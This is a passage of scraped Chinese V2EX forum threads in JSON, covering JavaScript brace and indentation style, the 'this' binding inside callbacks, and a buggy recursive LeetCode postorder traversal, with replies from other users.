{\r", "                            if ( cur.indexOf( \" \" + clazz + \" \" ) < 0 ) {\r", "                                cur += clazz + \" \";\r", "                            }\r", "                        }\r", "\r", "                        finalValue = jQuery.trim( cur );\r", "                        if ( elem.className !== finalValue ) {\r", "                            elem.className = finalValue;\r", "                        }\r", "                    }\r", "                }\r", "            }\r", "\r", "            return this;\r", "        }\r", "    });\r", "\r", "});\r", "```\r", "上面这种风格，难道没有人觉得代码块block很难理解吗？\r", "\r", "那么这样呢：\r", "```javascript\r", "define([\"../jquery\",], function( jQuery )\r", "{\r", "    var rclass = /[\\t\\r\\n\\f]/g;\r", "\r", "    jQuery.fn.extend(\r", "    {\r", "        addSomeClass: function( value )\r", "        {\r", "            if ( proceed )\r", "            {\r", "                classes = ( value || \"\" ).match( rnotwhite ) || [];\r", "\r", "                for ( ; i < len; i++ )\r", "                {\r", "                    elem = this[ i ];\r", "                    cur = elem.nodeType === 1 && ( elem.className ?\r", "                        ( \" \" + elem.className + \" \" ).replace( rclass, \" \" ) :\r", "                        \" \"\r", "                    );\r", "\r", "                    if ( cur )\r", "                    {\r", "                        j = 0;\r", "                        while ( (clazz = classes[j++]) )\r", "                        {\r", "                            // 当条件只有一行的时候省略 {} 花括号\r", "                            if ( cur.indexOf( \" \" + clazz + \" \" ) < 0 ) cur += clazz + \" \";\r", "                        }\r", "\r", "                        finalValue = jQuery.trim( cur );\r", "                        if ( elem.className !== finalValue )\r", "                        {\r", "                            elem.className = finalValue;\r", "                        }\r", "                    }\r", "                }\r", "            }\r", "\r", "            return this;\r", "        }\r", "    });\r", "\r", "});\r", "```\r", "花括号换行之后，是不是直观了很多呢？更容易看清楚了呢？\r", "如果换成2个空格，那个花括号换行在js里就更好看了：\r", "```javascript\r", "define([\"../jquery\",], function( jQuery )\r", "{\r", "  var rclass = /[\\t\\r\\n\\f]/g;\r", "\r", "  jQuery.fn.extend(\r", "  {\r", "    addSomeClass: function( value )\r", "    {\r", "      if ( proceed )\r", "      {\r", "        classes = ( value || \"\" ).match( rnotwhite ) || [];\r", "\r", "        for ( ; i < len; i++ )\r", "        {\r", "          if ( cur )\r", "          {\r", "            j = 0;\r", "            while ( (clazz = classes[j++]) )\r", "            {\r", "              // 当条件只有一行的时候省略 {} 花括号\r", "              if ( cur.indexOf( \" \" + clazz + \" \" ) < 0 ) cur += clazz + \" \";\r", "            }\r", "\r", "            finalValue = jQuery.trim( cur );\r", "            if ( elem.className !== finalValue )\r", "            {\r", "              elem.className = finalValue;\r", "            }\r", "          }\r", "        }\r", "      }\r", "\r", "      return this;\r", "      }\r", "  });\r", "\r", "});\r", "```\r", "是不是更加直观，容易看清楚了呢？\r", "\r", "所以，我不理解了，为什么大家常见都说2个空格，又写成4个空格，不换行，特别是2个空格的花括号不换行，难道看着成篇成篇的代码不难受吗？\r", "\r", "此文仅用于个人偏好讨论用。没有任何别的什么意思。", "天啊，不让我修改了，v2ex 的 markdown 语法分析器真是。。。服了", "好吧，顺着 v2ex 的 markdown 语法分析器，重新写了一个： "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如代码代示，js对象内访问，用 <code>this</code> 和 <code>obj</code> 都可以，但是在 对象方法内在 <code>callback</code> 里用 <code>this</code> 就会报未定义，但是用 <code>obj.remove</code> 就可以，求大神给指点一下，如何写比较好比较正确。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">define</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n\n    <span class=\"kd\">var</span> <span class=\"nx\">obj</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n\n        <span class=\"nx\">add</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"c1\">// 这里可以用 this</span>\n            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">edit</span><span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n                <span class=\"c1\">// 这里报 this 未定义</span>\n                <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">remove</span><span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"p\">);</span>\n                <span class=\"c1\">// 如果用 obj.remove() 就可以</span>\n                <span class=\"nx\">obj</span><span class=\"p\">.</span><span class=\"nx\">remove</span><span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"p\">);</span>\n            <span class=\"p\">});</span>\n            <span class=\"c1\">// 也可以用 obj.edit()</span>\n            <span class=\"c1\">// 哪种效率比较高呢？</span>\n            <span class=\"c1\">// 或者是比较标准的正确写法呢？</span>\n        <span class=\"p\">},</span>\n\n        <span class=\"nx\">edit</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'edit'</span><span class=\"p\">);</span>\n        <span class=\"p\">},</span>\n\n        <span class=\"nx\">remove</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">id</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'remove'</span><span class=\"p\">);</span>\n        <span class=\"p\">}</span>\n\n    <span class=\"p\">};</span>\n\n    <span class=\"k\">return</span> <span class=\"nx\">obj</span><span class=\"p\">;</span>\n<span class=\"p\">});</span>\n</pre></div>\n</div></div>"], "reply": "31", "tittle": "请教有一个 javascript 问题", "comment": ["调用this.edit 之前 _this = this;\r", "\r", "在传入函数里使用_this.", "是报 this.remove 未定义吧？", "this.edit(id, function() {\r", "this.remove(id);\r", "}.bind(this));\r", "\r", "但是，this.edit不是只接受一个参数吗？？", " 哈哈，是的，这是一个示例。", " 这样的话在对象内使用 `this` 和 `obj` 有啥区别呢？效率区别？标准区别？", " 是的，确切的来说是 this.remove 未定义。超出了作用域。", "极端得讲一下：\r", "1 this 永远指向 window\r", "2 除非你显式指定 this\r", "3 显式地指定this有如下方法：\r", "3.1 使用点语法指定，如obj.remove\r", "3.2 使用call和apply指定\r", "3.3 浏览器内置方法默认指定，如事件的回调等\r", "3.4 其他不建议的方法", "不要再用OOP的角度来理解JS的this了，不然你永远学不会。\r", "好好看看犀牛书，不要看了蝴蝶书就以为自己会JS了。", "3.2 还应加上 bind 等方法。", " 果然大神，一看就知道我纠结在哪了，真的这么多年 cpp java php 习惯性 oop 了，着手码几行 js 真心不适应，正在强迫自己适应中。\r", "\r", "从前端同事那里借了这个犀牛书，正在专研中！哈哈\r", "\r", "不过，我在 `var obj {..}` 里 `console` 出来了 `this`，出来一个对象，是 `var obj` 声明的这个对象本身。\r", "如果是 this 指向 window 的话，他应该有更多对象才对吧？", " 我上面说的是浏览器，所以用了极端两字。非浏览器的 this 会默认指向 null 或 global", " 你说的后半段我没看懂，贴出代码吧", "  挑个刺，漏了strict mode哈", " 嗯，“极端”。手机码字", " 所以就简化了一些", " ES5特性 ES3并没有", "现在有电脑了，就再说下吧。\r", "this和obj的区别，obj 很简单，就是一个对象的引用，你给 obj 赋值后它就固定了。\r", "但 this 不是，this 是一个函数在被调用时的上下文：\r", "1. 只有函数被调用时 this 才能确定是什么。\r", "如 obj.add 里的第一个 this，被你显式地指定为 obj，所以 this === obj\r", "但是如果你这样调用 `var anotherAdd = obj.add;  anotherAdd()`，那么 anotherAdd 被调用时的 this 就又是 window 了\r", "2. 每执行一个函数，都对应一个 this。\r", "所以你 obj.add 里的第2个 this，也就是`this.remove(id);` 这一句里的 this，由于没有显式指定，就有指向 window 了（在这一句话被执行的时候）", "不知道有没有说清楚，总之就是每看到一个 function 关键字，this 就有可能变化。\r", "this 跟对象无关，只与 function 有关。", "17 楼说得有点乱，没看懂就忽略，看 18 楼吧。", " 懂了！哈哈，太赞了！新技能 get 高兴中", "js可以用prototype来实现oop. \r", "感觉这样理解起来更容易.", "使用this 其实完全没有什么问题, 而且上面对this 的解释似乎有点小问题?\r", "\r", "可以参考MDN 的这个链接, 似乎是有意漏掉了某个?\r", "\r", "\r", "Javascript 的this 不是难理解, 只是因为它本身的一组特性综合导致他和别的语言不一样. 关于在闭包里使用this , 我最早是从阮一峰的blog 上看到最完整的概述的.\r", "\r", "效率问题, 都是引用. 作为一种习惯, 理解this 很重要, 因为这个已经是通行的做法了. \r", "\r", "掏出犀牛书第六版(第五版没有在学校), p188页 译者注释.\r", "\r", "仅作讨论, 求同存异. 希望不要引起争执.\r", "\r", "书, 个人不提供建议, 自认水平有限. 犀牛这本圣经扫了几遍, 但看红皮还是有很多要补的地方, 比如逻辑操作符具体的特性, 各种实现类方式的利弊, 以及各种兼容实现问题.", " prototype 实现的 oop 会有效率上的提升吗？因为我看到 prototype oop 在调用的时候太惨了 new(_) 那个下划线，那些个 find 真心觉得是乱码一样，比较难理解。", " 可以去看Javascript 高级程序设计, 相关例子会比犀牛书更完整.", "callback里的this没有这属性，this此时指向的是window。楼上很多大牛", " JavaScript中函数没有签名，传入函数的参数可以通过局部变量arguments（类数组对象）访问到。\r", " 可以看看《JavaScript高级程序设计 第三版》的7.2.2关于this对象这一节，里面的例子和你这个问题差不多。", " \r", "个人理解,oop的目的在于处理代码的复用性与可读性.效率的问题更依赖于或算法或运行环境来解决.\r", "\r", "至于你提到的new(_)什么什么的, 应该是你看的那段代码编写的不规范, 和prototype没关系啊. 推荐你去读一下阮一峰的博客:Javascript 面向对象编程, 深入浅出, 不能再赞.", " 受教😄", " 找到了，不错不错！赞！", "this.remove(); 非严格模式下，此处this指向的是window，严格模式下是null，所以，你懂得。。。", "var self=this;\r", "\r", "this是js里比较蛋疼的一个坑。\r", "\r", "主要和使用回调/对象有关系，其实你用用call,apply,需要你制定thisarg就能明白了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大半夜, 递归的有点乱...</p>\n\n<p>原题:<a target=\"_blank\" rel=\"nofollow\" href=\"https://leetcode.com/problems/binary-tree-postorder-traversal/\">Binary Tree Postorder Traversal</a></p>\n\n<hr>\n<div class=\"highlight\"><pre><span class=\"cm\">/**</span>\n<span class=\"cm\"> * Definition for binary tree</span>\n<span class=\"cm\"> * function TreeNode(val) {</span>\n<span class=\"cm\"> *     this.val = val;</span>\n<span class=\"cm\"> *     this.left = this.right = null;</span>\n<span class=\"cm\"> * }</span>\n<span class=\"cm\"> */</span>\n\n<span class=\"cm\">/**</span>\n<span class=\"cm\"> * @param {TreeNode} root</span>\n<span class=\"cm\"> * @returns {number[]}</span>\n<span class=\"cm\"> */</span>\n<span class=\"kd\">var</span> <span class=\"nx\">postorderTraversal</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">root</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nx\">result</span><span class=\"p\">)</span> <span class=\"kd\">var</span> <span class=\"nx\">result</span> <span class=\"o\">=</span> <span class=\"p\">[];</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nx\">root</span><span class=\"p\">)</span> <span class=\"k\">return</span> <span class=\"nx\">result</span><span class=\"p\">;</span>\n\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">root</span><span class=\"p\">.</span><span class=\"nx\">left</span><span class=\"p\">)</span> <span class=\"nx\">postorderTraversal</span><span class=\"p\">(</span><span class=\"nx\">root</span><span class=\"p\">.</span><span class=\"nx\">left</span><span class=\"p\">);</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">root</span><span class=\"p\">.</span><span class=\"nx\">right</span><span class=\"p\">)</span> <span class=\"nx\">postorderTraversal</span><span class=\"p\">(</span><span class=\"nx\">root</span><span class=\"p\">.</span><span class=\"nx\">right</span><span class=\"p\">);</span>\n  <span class=\"nx\">result</span><span class=\"p\">.</span><span class=\"nx\">push</span><span class=\"p\">(</span><span class=\"nx\">root</span><span class=\"p\">.</span><span class=\"nx\">val</span><span class=\"p\">);</span>\n\n  <span class=\"k\">return</span> <span class=\"nx\">result</span><span class=\"p\">;</span>\n<span class=\"p\">};</span>\n</pre></div>\n</div></div>"], "reply": "14", "tittle": "Leetcode 的一个后序遍历二叉树: 求帮忙看看以下代码有什么问题?", "comment": ["你的container result 是怎么个逻辑 return了但是不赋值? 第一感觉问题是出在这 不管input是什么你永远return []吧", " 我也感觉是 return 出问题了, 就是想不明白, 出啥问题了...\r", "\r", " 这代码逻辑清晰. 能帮忙解释下 我的代码 的硬伤在哪吗?", " 第一行 result 还没有定义的话可以这样判断？表示不太懂js。", " 第一行的单句执行是没有问题的.", " 你每次递归都会新建一个result，之前result没有进入递归，所以需要一个单独的递归函数，像@", " 那样对同一个result操作。", " 里面的递归调用 不能读取到外边的 result 吗?", "function postorderTraversal (root, result) {\r", "    if (!root) {\r", "        return;\r", "    }\r", "    if (root.left) postorderTraversal(root.left, result) ;\r", "    if (root.right) postorderTraversal(root.left, result);\r", "    result.push(root.val)\r", "}\r", "var result = {};\r", "postorderTraversal(root, result);\r", "这样写呢？", "递归尽量写程尾递归的形式，不然不断的压栈会内存会被大量占用，被搞死的。", " result 定义在外边是能行的.", " 你那result其实在递归函数里面的", " 一般来说这种在递归的时候收集信息的写法 有2种常见的控制container(你的result)的做法\r", "第一种是设置一个global 的container 就像@", " 的做法一样 这样你在递归的时候就只负责把设计到的数据加进这个global container就行了\r", "第二种是在每一层都return一个在这个层收集到的信息 然后由上一层来做merge\r", "\r", "我感觉你贴出来的代码是倾向于第二种做法 但是你在调用递归的时候并没有对返回值进行任何操作\r", "画个tree的图出来会帮助你理解递归具体是什么个顺序", "如果js的作用域跟我理解的差不多的话，你的result作用域只属于函数；所以当你递归处理root.left时，那个递归函数里的result还是空的。我猜测（因为现在忙里偷闲没时间测试），你需要在if语句里把递归函数返回的result的元素push进当前函数的result里", "如果你把result定义在外面，那么每次递归函数插入的元素都在同一个result里，就没问题。估计是个作用域的问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><ol>\n<li><p>缩进空格问题，像 tbs 这种流行框架什么的推荐是 2 格，但是看到多数人用 4 格。<br>\n那么现在问题来了，到底是空2格还是4格。。。</p></li>\n<li><p>括号和花括号</p></li>\n</ol>\n<div class=\"highlight\"><pre><span class=\"c1\">// 没空格</span>\n<span class=\"k\">if</span><span class=\"p\">(){</span>\n<span class=\"c1\">// 遇到花括号空1格</span>\n<span class=\"k\">if</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n<span class=\"c1\">// if 直接空1格</span>\n<span class=\"k\">if</span> <span class=\"p\">(){</span>\n<span class=\"c1\">// 都空1格</span>\n<span class=\"k\">if</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n<span class=\"c1\">// 条件空1格，花括号换行</span>\n<span class=\"k\">if</span> <span class=\"p\">()</span>\n<span class=\"p\">{</span>\n\n<span class=\"c1\">// 以上同样的问题也空在于 function 和 obj 上面</span>\n<span class=\"c1\">// 方法</span>\n<span class=\"kd\">function</span><span class=\"p\">(){</span>\n<span class=\"kd\">function</span> <span class=\"p\">(){</span>\n<span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n<span class=\"kd\">function</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n\n<span class=\"c1\">// 对象</span>\n<span class=\"kd\">var</span> <span class=\"nx\">obj</span><span class=\"p\">{</span>\n<span class=\"kd\">var</span> <span class=\"nx\">obj</span> <span class=\"p\">{</span>\n<span class=\"kd\">var</span> <span class=\"nx\">obj</span>\n<span class=\"p\">{</span>\n\n<span class=\"c1\">// 换行问题有大神说过Javascript会自动添加句末的分号，导致一些难以察觉的错误，</span>\n<span class=\"c1\">// 但是我觉得就算花括号不换行，但是在实际在文件中换行的地方多了去了，</span>\n<span class=\"c1\">// 所以这个自动添加句末的分号的问题不应该成为一个编程风格的理由。</span>\n\n<span class=\"c1\">// 按常见风格</span>\n<span class=\"nx\">define</span><span class=\"p\">([</span><span class=\"s2\">\"../jquery\"</span><span class=\"p\">,],</span> <span class=\"kd\">function</span><span class=\"p\">(</span> <span class=\"nx\">jQuery</span> <span class=\"p\">)</span> <span class=\"p\">{</span>\n\n    <span class=\"kd\">var</span> <span class=\"nx\">rclass</span> <span class=\"o\">=</span> <span class=\"sr\">/[\\t\\r\\n\\f]/g</span><span class=\"p\">;</span>\n\n    <span class=\"nx\">jQuery</span><span class=\"p\">.</span><span class=\"nx\">fn</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span>\n\n        <span class=\"nx\">addSomeClass</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span> <span class=\"nx\">value</span> <span class=\"p\">)</span> <span class=\"p\">{</span>\n\n            <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"nx\">proceed</span> <span class=\"p\">)</span> <span class=\"p\">{</span>\n                <span class=\"nx\">classes</span> <span class=\"o\">=</span> <span class=\"p\">(</span> <span class=\"nx\">value</span> <span class=\"o\">||</span> <span class=\"s2\">\"\"</span> <span class=\"p\">).</span><span class=\"nx\">match</span><span class=\"p\">(</span> <span class=\"nx\">rnotwhite</span> <span class=\"p\">)</span> <span class=\"o\">||</span> <span class=\"p\">[];</span>\n\n                <span class=\"k\">for</span> <span class=\"p\">(</span> <span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"nx\">len</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span> <span class=\"p\">)</span> <span class=\"p\">{</span>\n                    <span class=\"nx\">elem</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"p\">[</span> <span class=\"nx\">i</span> <span class=\"p\">];</span>\n                    <span class=\"nx\">cur</span> <span class=\"o\">=</span> <span class=\"nx\">elem</span><span class=\"p\">.</span><span class=\"nx\">nodeType</span> <span class=\"o\">===</span> <span class=\"mi\">1</span> <span class=\"o\">&amp;&amp;</span> <span class=\"p\">(</span> <span class=\"nx\">elem</span><span class=\"p\">.</span><span class=\"nx\">className</span> <span class=\"o\">?</span>\n                        <span class=\"p\">(</span> <span class=\"s2\">\" \"</span> <span class=\"o\">+</span> <span class=\"nx\">elem</span><span class=\"p\">.</span><span class=\"nx\">className</span> <span class=\"o\">+</span> <span class=\"s2\">\" \"</span> <span class=\"p\">).</span><span class=\"nx\">replace</span><span class=\"p\">(</span> <span class=\"nx\">rclass</span><span class=\"p\">,</span> <span class=\"s2\">\" \"</span> <span class=\"p\">)</span> <span class=\"o\">:</span>\n                        <span class=\"s2\">\" \"</span>\n                    <span class=\"p\">);</span>\n\n                    <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"nx\">cur</span> <span class=\"p\">)</span> <span class=\"p\">{</span>\n                        <span class=\"nx\">j</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n                        <span class=\"k\">while</span> <span class=\"p\">(</span> <span class=\"p\">(</span><span class=\"nx\">clazz</span> <span class=\"o\">=</span> <span class=\"nx\">classes</span><span class=\"p\">[</span><span class=\"nx\">j</span><span class=\"o\">++</span><span class=\"p\">])</span> <span class=\"p\">)</span> <span class=\"p\">{</span>\n                            <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"nx\">cur</span><span class=\"p\">.</span><span class=\"nx\">indexOf</span><span class=\"p\">(</span> <span class=\"s2\">\" \"</span> <span class=\"o\">+</span> <span class=\"nx\">clazz</span> <span class=\"o\">+</span> <span class=\"s2\">\" \"</span> <span class=\"p\">)</span> <span class=\"o\">&lt;</span> <span class=\"mi\">0</span> <span class=\"p\">)</span> <span class=\"p\">{</span>\n                                <span class=\"nx\">cur</span> <span class=\"o\">+=</span> <span class=\"nx\">clazz</span> <span class=\"o\">+</span> <span class=\"s2\">\" \"</span><span class=\"p\">;</span>\n                            <span class=\"p\">}</span>\n                        <span class=\"p\">}</span>\n\n                        <span class=\"nx\">finalValue</span> <span class=\"o\">=</span> <span class=\"nx\">jQuery</span><span class=\"p\">.</span><span class=\"nx\">trim</span><span class=\"p\">(</span> <span class=\"nx\">cur</span> <span class=\"p\">);</span>\n                        <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"nx\">elem</span><span class=\"p\">.</span><span class=\"nx\">className</span> <span class=\"o\">!==</span> <span class=\"nx\">finalValue</span> <span class=\"p\">)</span> <span class=\"p\">{</span>\n                            <span class=\"nx\">elem</span><span class=\"p\">.</span><span class=\"nx\">className</span> <span class=\"o\">=</span> <span class=\"nx\">finalValue</span><span class=\"p\">;</span>\n                        <span class=\"p\">}</span>\n                    <span class=\"p\">}</span>\n                <span class=\"p\">}</span>\n            <span class=\"p\">}</span>\n\n            <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">});</span>\n\n<span class=\"p\">});</span>\n<span class=\"c1\">// 上面这种风格，难道没有人觉得代码块block很难理解吗？</span>\n\n<span class=\"c1\">// 那么现在这样呢：</span>\n<span class=\"nx\">define</span><span class=\"p\">([</span><span class=\"s2\">\"../jquery\"</span><span class=\"p\">,],</span> <span class=\"kd\">function</span><span class=\"p\">(</span> <span class=\"nx\">jQuery</span> <span class=\"p\">)</span>\n<span class=\"p\">{</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">rclass</span> <span class=\"o\">=</span> <span class=\"sr\">/[\\t\\r\\n\\f]/g</span><span class=\"p\">;</span>\n\n    <span class=\"nx\">jQuery</span><span class=\"p\">.</span><span class=\"nx\">fn</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">(</span>\n    <span class=\"p\">{</span>\n        <span class=\"nx\">addSomeClass</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span> <span class=\"nx\">value</span> <span class=\"p\">)</span>\n        <span class=\"p\">{</span>\n            <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"nx\">proceed</span> <span class=\"p\">)</span>\n            <span class=\"p\">{</span>\n                <span class=\"nx\">classes</span> <span class=\"o\">=</span> <span class=\"p\">(</span> <span class=\"nx\">value</span> <span class=\"o\">||</span> <span class=\"s2\">\"\"</span> <span class=\"p\">).</span><span class=\"nx\">match</span><span class=\"p\">(</span> <span class=\"nx\">rnotwhite</span> <span class=\"p\">)</span> <span class=\"o\">||</span> <span class=\"p\">[];</span>\n\n                <span class=\"k\">for</span> <span class=\"p\">(</span> <span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"nx\">len</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span> <span class=\"p\">)</span>\n                <span class=\"p\">{</span>\n                    <span class=\"nx\">elem</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"p\">[</span> <span class=\"nx\">i</span> <span class=\"p\">];</span>\n                    <span class=\"nx\">cur</span> <span class=\"o\">=</span> <span class=\"nx\">elem</span><span class=\"p\">.</span><span class=\"nx\">nodeType</span> <span class=\"o\">===</span> <span class=\"mi\">1</span> <span class=\"o\">&amp;&amp;</span> <span class=\"p\">(</span> <span class=\"nx\">elem</span><span class=\"p\">.</span><span class=\"nx\">className</span> <span class=\"o\">?</span>\n                        <span class=\"p\">(</span> <span class=\"s2\">\" \"</span> <span class=\"o\">+</span> <span class=\"nx\">elem</span><span class=\"p\">.</span><span class=\"nx\">className</span> <span class=\"o\">+</span> <span class=\"s2\">\" \"</span> <span class=\"p\">).</span><span class=\"nx\">replace</span><span class=\"p\">(</span> <span class=\"nx\">rclass</span><span class=\"p\">,</span> <span class=\"s2\">\" \"</span> <span class=\"p\">)</span> <span class=\"o\">:</span>\n                        <span class=\"s2\">\" \"</span>\n                    <span class=\"p\">);</span>\n\n                    <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"nx\">cur</span> <span class=\"p\">)</span>\n                    <span class=\"p\">{</span>\n                        <span class=\"nx\">j</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n                        <span class=\"k\">while</span> <span class=\"p\">(</span> <span class=\"p\">(</span><span class=\"nx\">clazz</span> <span class=\"o\">=</span> <span class=\"nx\">classes</span><span class=\"p\">[</span><span class=\"nx\">j</span><span class=\"o\">++</span><span class=\"p\">])</span> <span class=\"p\">)</span>\n                        <span class=\"p\">{</span>\n                            <span class=\"c1\">// 当条件只有一行的时候省略 {} 花括号</span>\n                            <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"nx\">cur</span><span class=\"p\">.</span><span class=\"nx\">indexOf</span><span class=\"p\">(</span> <span class=\"s2\">\" \"</span> <span class=\"o\">+</span> <span class=\"nx\">clazz</span> <span class=\"o\">+</span> <span class=\"s2\">\" \"</span> <span class=\"p\">)</span> <span class=\"o\">&lt;</span> <span class=\"mi\">0</span> <span class=\"p\">)</span> <span class=\"nx\">cur</span> <span class=\"o\">+=</span> <span class=\"nx\">clazz</span> <span class=\"o\">+</span> <span class=\"s2\">\" \"</span><span class=\"p\">;</span>\n                        <span class=\"p\">}</span>\n\n                        <span class=\"nx\">finalValue</span> <span class=\"o\">=</span> <span class=\"nx\">jQuery</span><span class=\"p\">.</span><span class=\"nx\">trim</span><span class=\"p\">(</span> <span class=\"nx\">cur</span> <span class=\"p\">);</span>\n                        <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"nx\">elem</span><span class=\"p\">.</span><span class=\"nx\">className</span> <span class=\"o\">!==</span> <span class=\"nx\">finalValue</span> <span class=\"p\">)</span>\n                        <span class=\"p\">{</span>\n                            <span class=\"nx\">elem</span><span class=\"p\">.</span><span class=\"nx\">className</span> <span class=\"o\">=</span> <span class=\"nx\">finalValue</span><span class=\"p\">;</span>\n                        <span class=\"p\">}</span>\n                    <span class=\"p\">}</span>\n                <span class=\"p\">}</span>\n            <span class=\"p\">}</span>\n\n            <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">});</span>\n\n<span class=\"p\">});</span>\n<span class=\"c1\">// 花括号换行之后，是不是直观了很多呢？更容易看清楚了呢？</span>\n<span class=\"c1\">// 如果换成2个空格，那个花括号换行在js里就更好看了：</span>\n<span class=\"nx\">define</span><span class=\"p\">([</span><span class=\"s2\">\"../jquery\"</span><span class=\"p\">,],</span> <span class=\"kd\">function</span><span class=\"p\">(</span> <span class=\"nx\">jQuery</span> <span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">rclass</span> <span class=\"o\">=</span> <span class=\"sr\">/[\\t\\r\\n\\f]/g</span><span class=\"p\">;</span>\n\n  <span class=\"nx\">jQuery</span><span class=\"p\">.</span><span class=\"nx\">fn</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">(</span>\n  <span class=\"p\">{</span>\n    <span class=\"nx\">addSomeClass</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span> <span class=\"nx\">value</span> <span class=\"p\">)</span>\n    <span class=\"p\">{</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"nx\">proceed</span> <span class=\"p\">)</span>\n      <span class=\"p\">{</span>\n        <span class=\"nx\">classes</span> <span class=\"o\">=</span> <span class=\"p\">(</span> <span class=\"nx\">value</span> <span class=\"o\">||</span> <span class=\"s2\">\"\"</span> <span class=\"p\">).</span><span class=\"nx\">match</span><span class=\"p\">(</span> <span class=\"nx\">rnotwhite</span> <span class=\"p\">)</span> <span class=\"o\">||</span> <span class=\"p\">[];</span>\n\n        <span class=\"k\">for</span> <span class=\"p\">(</span> <span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"nx\">len</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span> <span class=\"p\">)</span>\n        <span class=\"p\">{</span>\n          <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"nx\">cur</span> <span class=\"p\">)</span>\n          <span class=\"p\">{</span>\n            <span class=\"nx\">j</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n            <span class=\"k\">while</span> <span class=\"p\">(</span> <span class=\"p\">(</span><span class=\"nx\">clazz</span> <span class=\"o\">=</span> <span class=\"nx\">classes</span><span class=\"p\">[</span><span class=\"nx\">j</span><span class=\"o\">++</span><span class=\"p\">])</span> <span class=\"p\">)</span>\n            <span class=\"p\">{</span>\n              <span class=\"c1\">// 当条件只有一行的时候省略 {} 花括号</span>\n              <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"nx\">cur</span><span class=\"p\">.</span><span class=\"nx\">indexOf</span><span class=\"p\">(</span> <span class=\"s2\">\" \"</span> <span class=\"o\">+</span> <span class=\"nx\">clazz</span> <span class=\"o\">+</span> <span class=\"s2\">\" \"</span> <span class=\"p\">)</span> <span class=\"o\">&lt;</span> <span class=\"mi\">0</span> <span class=\"p\">)</span> <span class=\"nx\">cur</span> <span class=\"o\">+=</span> <span class=\"nx\">clazz</span> <span class=\"o\">+</span> <span class=\"s2\">\" \"</span><span class=\"p\">;</span>\n            <span class=\"p\">}</span>\n\n            <span class=\"nx\">finalValue</span> <span class=\"o\">=</span> <span class=\"nx\">jQuery</span><span class=\"p\">.</span><span class=\"nx\">trim</span><span class=\"p\">(</span> <span class=\"nx\">cur</span> <span class=\"p\">);</span>\n            <span 